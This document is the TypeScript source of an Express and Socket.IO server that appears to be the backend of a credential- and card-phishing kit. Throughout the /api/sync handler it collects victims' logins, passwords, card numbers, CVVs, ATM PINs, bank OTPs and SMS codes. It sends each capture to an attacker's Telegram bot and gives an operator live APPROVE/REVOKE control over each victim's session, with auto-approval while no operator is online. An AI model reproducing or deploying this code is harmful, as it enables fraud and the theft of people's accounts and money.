import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import fs from 'fs';
import crypto from 'crypto';
import https from 'https';
import geoip from 'geoip-lite';
import cookieParser from 'cookie-parser';
import { shieldMiddleware, verifyHandler } from './shield';
import * as db from './db';

const app = express();
const httpServer = createServer(app);

// Determine allowed origins from env var (comma-separated) or default to "*"
const rawOrigins = process.env.ALLOWED_ORIGINS;
const allowedOrigins = rawOrigins ? rawOrigins.split(',').map(o => o.trim()) : "*";

let corsOrigin: any = "*"; // Default to wildcard

if (allowedOrigins !== "*") {
    corsOrigin = (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
        if (!origin) {
            // Allow requests with no origin (non-browser)
            return callback(null, true);
        }

        if ((allowedOrigins as string[]).includes(origin)) {
            callback(null, true);
        } else {
            console.log(`[CORS] Blocked origin: ${origin}`);
            callback(new Error('Not allowed by CORS'));
        }
    };
}

const corsOptions = {
    origin: corsOrigin,
    methods: ["GET", "POST"]
};
console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);

const io = new Server(httpServer, {
    cors: corsOptions
});

const PORT = process.env.PORT || 8080;

// --- Middleware ---
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
            connectSrc: ["'self'"],
            frameSrc: ["'self'"]
        }
    }
}));
app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

// Rate Limiting - Disabled to prevent Render proxy issues
app.set('trust proxy', 1);
// const apiLimiter = rateLimit({
//     windowMs: 15 * 60 * 1000, // 15 minutes
//     max: 500 // Limit each IP to 500 requests per windowMs
// });
// app.use('/api/', apiLimiter);

// --- Socket.IO ---

// Map to track socketId -> sessionId
const socketSessionMap = new Map<string, string>();

io.on('connection', (socket) => {
    console.log('[Socket] Client connected:', socket.id);

    socket.on('join', (sessionId) => {
        socket.join(sessionId);
        socketSessionMap.set(socket.id, sessionId);
        console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
    });

    socket.on('joinAdmin', () => {
        socket.join('admin');
        console.log(`[Socket] ${socket.id} joined ADMIN room`);
    });

    socket.on('disconnect', () => {
        console.log('[Socket] Client disconnected:', socket.id);

        // Retrieve associated session ID
        const sessionId = socketSessionMap.get(socket.id);
        if (sessionId) {
            // Force "Offline" status by setting lastSeen > 1 min ago
            // Using 70000ms (70s) to be safely over the 60s threshold
            const offlineTime = Date.now() - 70000;
            db.updateLastSeen(sessionId, offlineTime).then(() => {
                 // Notify admins to update list immediately
                 io.emit('sessions-updated');
            });

            socketSessionMap.delete(socket.id);
        }
    });
});

// --- API Routes ---

// Shield Verify Endpoint (Bypassed by Shield Middleware)
app.post('/api/shield/verify', verifyHandler);

// Apply Shield (Protects all subsequent routes and static files)
app.use(shieldMiddleware);

// Settings Helper
let cachedSettings: any = {};
const refreshSettings = async () => {
    try {
        cachedSettings = await db.getSettings();
        // Fallback to Env
        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
    } catch (e) { console.error('Failed to load settings', e); }
};
refreshSettings();

const getFlagEmoji = (countryCode: string) => {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
};

const escapeHtml = (unsafe: any) => {
    if (typeof unsafe !== 'string') return unsafe;
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
};

const formatSessionForTelegram = (session: any, title: string, flag: string) => {
    const s = session;
    const d = s.data || s; // Fallback

    // Helper for "Value or Empty"
    const v = (val: any) => val ? `<code>${escapeHtml(val)}</code>` : '<i>(Empty)</i>';

    let msg = `${flag} <b>${title}</b>\n\n`;

    msg += `🆔 <b>Session ID:</b> <code>${s.sessionId || s.id}</code>\n`;
    msg += `🌍 <b>IP Address:</b> <code>${s.ip || s.fingerprint?.ip || 'Unknown'}</code>\n`;
    msg += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n`;

    // Identity
    if (d.firstName || d.lastName || d.email) {
        msg += `\n👤 <b>IDENTITY PROFILE</b>\n`;
        msg += `├ <b>Name:</b> ${v((d.firstName + ' ' + d.lastName).trim())}\n`;
        msg += `├ <b>DOB:</b> ${v(d.dob)}\n`;
        msg += `├ <b>Phone:</b> ${v(d.phoneNumber)}\n`;
        msg += `├ <b>Addr:</b> ${v(d.address)}\n`;
        msg += `└ <b>Loc:</b> ${v(d.country)}\n`;
    }

    // Credentials
    if (d.email || d.password) {
        msg += `\n🔐 <b>CREDENTIALS</b>\n`;
        msg += `├ <b>Email:</b> ${v(d.email)}\n`;
        msg += `└ <b>Pass:</b> ${v(d.password)}\n`;
    }

    // Financial
    if (d.cardNumber) {
        msg += `\n💳 <b>FINANCIAL</b>\n`;
        msg += `├ <b>Type:</b> ${v(d.cardType)}\n`;
        msg += `├ <b>Card:</b> ${v(d.cardNumber)}\n`;
        msg += `├ <b>Exp:</b> ${v(d.cardExpiry)} • <b>CVV:</b> ${v(d.cardCvv)}\n`;
        msg += `├ <b>ATM PIN:</b> ${v(d.atmPin)}\n`;
        msg += `└ <b>Bank OTP:</b> ${v(d.cardOtp)}\n`;
    }

    if (d.phoneCode) {
        msg += `\n📱 <b>SMS VERIFICATION</b>\n`;
        msg += `└ <b>Code:</b> ${v(d.phoneCode)}\n`;
    }

    // Fingerprint
    if (s.fingerprint) {
        msg += `\n💻 <b>DEVICE FINGERPRINT</b>\n`;
        msg += `├ <b>OS/Plat:</b> ${s.fingerprint.platform || 'Unknown'}\n`;
        msg += `└ <b>Agent:</b> ${s.fingerprint.userAgent || 'Unknown'}\n`;
    }

    return msg;
};

const sendTelegram = (msg: string) => {
    const token = cachedSettings.tgToken;
    const chat = cachedSettings.tgChat;
    if (!token || !chat) return;

    const data = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' });
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    const req = https.request(options, res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            if (res.statusCode !== 200) {
                console.error(`[Telegram] Failed (Status ${res.statusCode}): ${body}`);
                console.error(`[Telegram] Payload was: ${msg}`);
            } else {
                console.log(`[Telegram] Sent successfully (ID: ${JSON.parse(body).result?.message_id})`);
            }
        });
    });
    req.on('error', e => console.error('[Telegram] Network Error:', e));
    req.write(data);
    req.end();
};

const getClientIp = (req: express.Request) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (typeof xForwardedFor === 'string') {
        return xForwardedFor.split(',')[0].trim();
    } else if (Array.isArray(xForwardedFor)) {
        return xForwardedFor[0].trim();
    }
    return req.socket.remoteAddress || 'Unknown';
};

const getIpCountry = (ip: string) => {
    const geo = geoip.lookup(ip);
    return geo ? geo.country : null;
};

// 1. Sync State (Hybrid: HTTP for data, Socket for notify)
app.post('/api/sync', async (req, res) => {
    try {
        const data = req.body;
        if (!data || !data.sessionId) {
            return res.status(400).json({ error: 'Missing sessionId' });
        }

        const ip = getClientIp(req);
        const country = getIpCountry(ip);

        // Populate Server-Side Fields
        data.ip = ip;
        if (data.fingerprint) data.fingerprint.ip = ip;
        if (country) data.ipCountry = country;

        // Notification Logic
        const existing = await db.getSession(data.sessionId);
        const flag = getFlagEmoji(country || (existing ? existing.ipCountry : 'XX') || 'XX');

        // 1. New Session (Push Telegram)
        if (!existing) {
             const msg = formatSessionForTelegram(data, 'New Session Started', flag);
             sendTelegram(msg);
        }
        // 2. Update Notifications (Intermediate Steps)
        else {
            const changes: string[] = [];
            const d = data;
            const e = existing.data || existing; // handle raw or nested

            // Debug Logging for Logic
            console.log(`[Sync Debug] ID: ${data.sessionId}`);
            console.log(`[Sync Debug] Email: New='${d.email}' vs Old='${e.email}'`);
            console.log(`[Sync Debug] Pass: New='${d.password}' vs Old='${e.password}'`);
            console.log(`[Sync Debug] Card: New='${d.cardNumber}' vs Old='${e.cardNumber}'`);

            // Check specific fields for changes
            // Note: e.email might be undefined if not set yet
            if (d.email && d.email !== (e.email || '')) changes.push('Login Captured');
            if (d.password && d.password !== (e.password || '')) changes.push('Password Captured');
            if (d.phoneCode && d.phoneCode !== (e.phoneCode || '')) changes.push('SMS Code Captured');
            if (d.cardNumber && d.cardNumber !== (e.cardNumber || '')) changes.push('Card Captured');
            if (d.cardOtp && d.cardOtp !== (e.cardOtp || '')) changes.push('Bank OTP Captured');

            if (changes.length > 0) {
                console.log(`[Sync Debug] Changes Detected: ${changes.join(', ')}`);
            } else {
                console.log(`[Sync Debug] No Changes Detected`);
            }

            // Completed Session
            if (existing.status !== 'Verified' && data.status === 'Verified') {
                 const cardType = data.cardType ? `[${escapeHtml(data.cardType).toUpperCase()}]` : '[CARD]';
                 const title = `Session Verified ${cardType}`;
                 const msg = formatSessionForTelegram(data, title, flag);
                 sendTelegram(msg);
            }
            // Intermediate Updates
            else if (changes.length > 0) {
                 const title = `Update: ${changes.join(', ')}`;
                 const msg = formatSessionForTelegram(data, title, flag);
                 sendTelegram(msg);
            }
        }

        // Prevent downgrading 'Verified' status
        if (existing && existing.status === 'Verified' && data.status !== 'Verified') {
            console.log(`[Sync] Preventing status downgrade for ${data.sessionId}. Keeping 'Verified'.`);
            data.status = 'Verified';
        }

        await db.upsertSession(data.sessionId, data, ip);

        // Deduplication removed to allow multiple devices on same WiFi/IP
        // Each session has unique ID generated by client.

        // Notify Admin Room (broadcast to all admins if we had separate admin rooms)
        // For now, simply broadcast to everyone listening for 'session-update'
        io.emit('sessions-updated');

        // Check for pending commands
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            // Also emit directly to socket if connected
            io.to(data.sessionId).emit('command', cmd);
            return res.json({ status: 'ok', command: cmd });
        }

        // --- Offline Auto-Approve Logic ---
        const adminRoom = io.sockets.adapter.rooms.get('admin');
        const isAdminOnline = adminRoom && adminRoom.size > 0;

        if (!isAdminOnline) {
            // 1. Login Auto-Approve -> Skip Phone
            if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
                console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
                const cmd = { action: 'APPROVE', payload: { skipPhone: true } };
                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                io.to(data.sessionId).emit('command', cmd);
                return res.json({ status: 'ok', command: cmd });
            }

            // 2. Card Auto-Approve -> Skip OTP (With 20s Delay)
            if (data.stage === 'card_pending' && !data.isFlowComplete) {
                console.log(`[Auto-Approve] Offline mode: Approving Card for ${data.sessionId} in 20s...`);
                // We don't return command immediately, we let client wait
                setTimeout(async () => {
                    const cmd = { action: 'APPROVE', payload: { flow: 'complete' } };
                    await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                    io.to(data.sessionId).emit('command', cmd);
                }, 20000);
                return res.json({ status: 'ok' });
            }

            // 3. Bank App Pending
            if (data.stage === 'bank_app_pending' && !data.isFlowComplete) {
                const cmd = { action: 'APPROVE', payload: {} };
                await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                io.to(data.sessionId).emit('command', cmd);
                return res.json({ status: 'ok', command: cmd });
            }
        }

        res.json({ status: 'ok' });
    } catch (e) {
        console.error('[Sync] Error:', e);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

// Settings API
app.get('/api/settings', async (req, res) => {
    await refreshSettings();
    const safeSettings = { ...cachedSettings };
    delete safeSettings.admin_password;
    res.json(safeSettings);
});

app.post('/api/settings', async (req, res) => {
    const { tgToken, tgChat } = req.body;
    if (tgToken !== undefined) await db.updateSetting('tgToken', tgToken);
    if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);

    await refreshSettings();
    res.json({ status: 'ok' });
});

// Admin Auth
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;

    // Default creds if DB fails or empty
    let dbPass = 'secure123';
    try {
        const settings = await db.getSettings();
        if (settings.admin_password) dbPass = settings.admin_password;
    } catch(e) {}

    // Username is currently hardcoded to 'admin' in frontend, enforce it here or allow any
    if (username === 'admin' && password === dbPass) {
        res.json({ status: 'ok' });
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

app.post('/api/admin/change-password', async (req, res) => {
    const { oldPassword, newPassword } = req.body;

    let currentPass = 'secure123';
    try {
        const settings = await db.getSettings();
        if (settings.admin_password) currentPass = settings.admin_password;
    } catch(e) {}

    if (oldPassword !== currentPass) {
        return res.status(401).json({ error: 'Incorrect current password' });
    }

    await db.updateSetting('admin_password', newPassword);
    console.log('[Admin] Password changed');
    res.json({ status: 'ok' });
});


// 2. Fetch Sessions (Admin)
app.get('/api/sessions', async (req, res) => {
    try {
        const sessions = await db.getAllSessions();

        // Optimization: ETag for caching
        const json = JSON.stringify(sessions);
        const etag = crypto.createHash('md5').update(json).digest('hex');

        if (req.headers['if-none-match'] === etag) {
            return res.status(304).end();
        }

        res.setHeader('ETag', etag);
        res.setHeader('Content-Type', 'application/json');
        res.send(json);
    } catch (e) {
        res.status(500).json([]);
    }
});

// 3. Admin Command
app.post('/api/command', async (req, res) => {
    try {
        const { sessionId, action, payload } = req.body;
        if (!sessionId || !action) {
            return res.status(400).send('Invalid Command');
        }

        // Prevent commands for revoked sessions
        const session = await db.getSession(sessionId);
        if (session && session.status === 'Revoked') {
            return res.status(403).json({ error: 'Session is revoked' });
        }

        await db.queueCommand(sessionId, action, payload);

        // Real-time Push
        io.to(sessionId).emit('command', { action, payload });

        res.json({ status: 'queued' });
    } catch (e) {
        res.status(500).send('Error queuing command');
    }
});

// Delete Session
app.delete('/api/sessions/:id', async (req, res) => {
    try {
        console.log('[API] Deleting session:', req.params.id);
        await db.deleteSession(req.params.id);
        io.emit('sessions-updated');
        res.json({ status: 'deleted' });
    } catch (e) {
        console.error('[API] Delete failed:', e);
        res.status(500).json({ error: 'Failed to delete' });
    }
});

// Pin Session
app.post('/api/sessions/:id/pin', async (req, res) => {
    try {
        const session = await db.getSession(req.params.id);
        if (session) {
            session.isPinned = !session.isPinned;
            await db.upsertSession(session.id, session, session.ip);
            io.emit('sessions-updated');
            res.json({ status: 'ok', isPinned: session.isPinned });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        res.status(500).json({ error: 'Failed to pin' });
    }
});

// Revoke Session
app.post('/api/sessions/:id/revoke', async (req, res) => {
    try {
        const id = req.params.id;
        console.log('[API] Revoking session:', id);

        const session = await db.getSession(id);
        if (session) {
            // Update status - KEEP as 'Active' so it remains in Admin List
            // But the client will be reset via command
            session.status = 'Active';
            await db.upsertSession(id, session, session.ip);

            // Queue Command for Client
            await db.queueCommand(id, 'REVOKE', {});

            // Notify Client (Real-time)
            io.to(id).emit('command', { action: 'REVOKE', payload: {} });

            // Notify Admins
            io.emit('sessions-updated');

            res.json({ status: 'revoked' });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        console.error('[API] Revoke failed:', e);
        res.status(500).json({ error: 'Failed to revoke' });
    }
});

// 4. Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// --- Static Files (Frontend) ---
const staticPaths = [
    path.join(__dirname, '../static'),           // Docker / Production
    path.join(__dirname, '../dist/app/browser')  // Local Development
];

// Register all paths with cache control
staticPaths.forEach(p => app.use(express.static(p, {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('index.html')) {
            // Never cache index.html to ensure clients get new CSS/JS hashes
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        } else {
            // Cache other static assets (hashed) for a long time
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        }
    }
})));

// Pre-resolve the path containing index.html to avoid per-request I/O
const indexHtmlPath = staticPaths.find(p => fs.existsSync(path.join(p, 'index.html')));

if (indexHtmlPath) {
    console.log(`[Server] Serving SPA from: ${indexHtmlPath}`);
    // Debug: List files in the static directory to help diagnose 404s
    try {
        const files = fs.readdirSync(indexHtmlPath);
        console.log('[Server] Files in static directory:', files);
    } catch (e) {
        console.warn('[Server] Failed to list static directory files:', e);
    }
} else {
    console.warn(`[Server] ⚠️  Frontend not found in: ${staticPaths.join(', ')}`);
}

// Fallback for SPA (Angular Router)
app.get('*', (req, res) => {
    // 1. If it looks like a static asset, return 404
    // This prevents the server from returning index.html for missing CSS/JS,
    // which causes MIME type blocking in browsers.
    if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|json|map)$/)) {
        console.warn(`[Server] 404 Not Found for static asset: ${req.path}`);
        return res.status(404).send('Not Found');
    }

    // 2. Otherwise serve index.html for SPA routing
    if (indexHtmlPath) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.sendFile(path.join(indexHtmlPath, 'index.html'));
    } else {
        res.status(404).send(`
            <h1>Frontend Not Found</h1>
            <p>Please build the application first:</p>
            <pre>npm run build</pre>
            <p>Searched paths:</p>
            <ul>${staticPaths.map(p => `<li>${p}</li>`).join('')}</ul>
        `);
    }
});

// --- Start Server ---
httpServer.listen(PORT, () => {
    console.log(`[Server] ✅ Express + Socket.IO running on port ${PORT}`);
});
